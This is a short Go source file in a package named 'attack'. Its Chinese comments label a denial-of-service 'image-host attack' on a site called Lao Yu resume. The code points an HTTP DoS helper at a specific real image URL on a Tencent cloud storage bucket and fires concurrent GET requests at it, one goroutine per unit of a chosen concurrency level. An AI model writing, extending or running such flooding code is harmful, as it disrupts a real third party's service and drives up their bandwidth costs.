package attack

import (
	"dos/utils"
)

// LYJLAttack 老鱼简历攻击
type LYJLAttack struct {
}

func NewLYJLAttack() *LYJLAttack {
	return &LYJLAttack{}
}

// DrawingBedAttack 图床攻击
func (l *LYJLAttack) DrawingBedAttack(concurrencyLevel int) {
	headers := map[string]string{}
	headers["Content-Type"] = "application/image"
	dos := utils.NewHttpDos(
		"https://yupi-picture-1256524210.cos.ap-shanghai.myqcloud.com/640-20230912144925212.png",
		nil,
		headers)
	for i := 0; i < concurrencyLevel; i++ {
		go func() {
			dos.Get()
		}()
	}

}
